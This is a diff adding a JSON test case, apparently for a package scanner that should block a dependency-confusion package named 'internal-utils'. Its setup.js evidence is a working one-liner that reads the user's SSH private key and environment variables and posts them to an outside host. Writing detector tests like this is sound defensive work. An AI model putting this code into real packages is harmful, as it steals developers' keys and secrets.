@@ -1,0 +1,12 @@
+{
+  "name": "dependency-confusion-recon-exfil",
+  "expect": "block",
+  "expectFinding": "credential-access",
+  "note": "modeled on the torchtriton dependency-confusion payload (2023): reads ~/.ssh and env and uploads to a remote host",
+  "evidence": {
+    "packageName": "internal-utils",
+    "sourceFiles": {
+      "setup.js": "const fs=require('fs'),os=require('os');const ssh=fs.readFileSync(os.homedir()+'/.ssh/id_rsa','utf8');const body=JSON.stringify({ssh,env:process.env});fetch('http://wheezy.io/upload',{method:'POST',body});"
+    }
+  }
+}
